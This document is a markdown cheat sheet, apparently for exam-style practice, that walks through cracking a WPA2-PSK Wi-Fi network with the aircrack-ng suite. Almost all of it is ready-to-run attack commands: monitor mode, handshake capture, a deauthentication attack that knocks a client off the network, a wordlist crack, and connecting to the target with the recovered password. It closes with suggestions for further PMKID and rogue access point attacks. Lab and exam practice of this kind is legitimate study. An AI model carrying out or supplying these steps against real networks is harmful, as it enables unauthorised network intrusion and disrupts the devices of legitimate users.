
# 🛡️ WPA2-PSK Attack – SSH-only, exam-style flow

## ⚙️ 0. Initial Setup

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Monitor mode enabled on `wlan0mon`.

---

## 🔍 1. Scan for Targets

```bash
sudo airodump-ng wlan0mon
```

Identify:
- `BSSID`
- `Channel`
- `ESSID`
- Associated `Clients`

---

## 🎯 2. Capture Handshake

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w wpa2-crack wlan0mon
```

Keep this running. You're sniffing for the WPA handshake.

---

## 💣 3. Force Handshake with Deauth

```bash
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```

This forces the client to disconnect and reconnect, generating the handshake.

---

## 👁️ 4. Confirm Handshake

Look for:

```
WPA handshake: <BSSID>
```

in the top-right corner of `airodump-ng`.

---

## 🔓 5. Crack the Password

```bash
aircrack-ng -w rockyou.txt -b <BSSID> wpa2-crack-01.cap
```

Substitute `rockyou.txt` with your wordlist path.

---

## 🔌 6. Connect Using wpa_supplicant

### wpa2.conf

```ini
network={
    ssid="wifi-mobile"
    psk="your_cracked_password"
    key_mgmt=WPA-PSK
}
```

### Launch connection

```bash
sudo airmon-ng stop wlan0mon
sudo wpa_supplicant -i wlan0 -c wpa2.conf -D nl80211 -B
sudo dhclient wlan0
```

---

## ✅ 7. Confirm Network Access

```bash
ip a
ping 192.168.2.1
```

Look for an assigned `inet` IP like:

```
inet 192.168.2.48/24 brd 192.168.2.255 scope global dynamic wlan0
```

You're inside the network.

---

Next up: PMKID attacks, hashcat brute force, or rogue APs. Your call.
